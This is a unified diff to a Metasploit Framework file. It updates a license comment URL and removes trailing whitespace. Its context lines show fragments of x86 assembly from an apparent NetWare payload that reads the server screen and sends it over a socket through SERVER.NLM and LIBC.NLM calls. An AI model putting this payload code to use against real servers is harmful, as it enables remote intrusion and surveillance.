@@ -5,8 +5,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'metasm'
@@ -266,7 +266,7 @@ end:
 	push ebp              ; rescode
 	push [edi-0x40]       ; socket
 	call [edi-0x34]       ; LIBC.NLM|bsd_close_mp
-	
+
 	; go back to the main kernel loop
 	call [edi-0x0C]       ; SERVER.NLM|kWorkerThread
 
@@ -339,7 +339,7 @@ send_screen:
 	push [edi+0x10]
 	call [edi-0x10]       ; SERVER.NLM|GetInputCursorPosition
 	add esp, 0x0c
-	
+
 	mov ebx, [esp+0x0c]
 	xor edx, edx
 	mov ecx, [edi+0x0c]
@@ -360,17 +360,17 @@ next_send:
 	push ecx
 	call send_data
 	add esp, 0x08
-	
+
 	cmp bx, word ptr[esi+2]
 	jae end_sl
-	
+
 	push 0x0000000a
 	mov eax, esp
 	push 1
 	push eax
 	call send_data
 	add esp, 0x0C
-	
+
 	inc ebx
 	add ecx, edx
 	cmp bx, word ptr[esi+2]
@@ -410,7 +410,7 @@ sendrecv_data:
 	push [ebp+0x20]         ; iov_len
 	push [ebp+0x1C]         ; iov_base
 	mov ecx, esp            ; msg_iov
-	
+
 	xor ebx, ebx            ; struct msghdr
 	push ebx                ; msg_flags
 	push ebx                ; msg_controllen
@@ -421,25 +421,25 @@ sendrecv_data:
 	push ecx                ; msg_iov
 	push ebx                ; msg_namelen
 	push ebx                ; msg_name
-	
+
 	mov ecx, esp            ; message
-	
+
 	sub esp, 4
 	mov edx, esp            ; rescode
-	
+
 	push edx                ; rescode
 	push 0                  ; flags
 	push ecx                ; message
 	push [ebp+0x18]         ; socket
 	call [ebp+0x14]         ; SERVER.NLM|bsd_recvmsg_mp
-	
+
 	mov esp, ebp
 	pop edx
 	pop ebx
 	pop ecx
 	pop ebp
 	ret
-	
+
 
 
 
